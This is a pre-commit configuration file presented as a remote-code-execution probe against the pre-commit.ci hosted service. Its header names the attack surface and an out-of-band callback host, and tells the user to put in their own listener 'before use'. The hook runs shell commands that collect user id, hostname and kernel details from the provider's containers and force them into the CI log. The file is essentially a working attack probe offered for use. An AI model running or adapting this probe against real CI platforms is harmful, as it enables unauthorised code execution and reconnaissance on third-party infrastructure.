# rcexec probe — pre-commit.ci SaaS
# Surface: language: system hooks execute raw shell in pre-commit.ci containers
# OOB: dba7in09drvebvvemiogs53d1at9mapqp.oast.pro
# Probe ID: PRECOMMIT-001
# Replace OOB_HOST with your live interactsh hostname before use

repos:
  - repo: local
    hooks:
      - id: rcexec-probe
        name: rcexec-probe
        language: system
        entry: >-
          bash -c 'echo "RCEXEC:id=$(id):whoami=$(whoami):hostname=$(hostname):uname=$(uname -a)" && exit 1'
        files: ''
        pass_filenames: false
        always_run: true
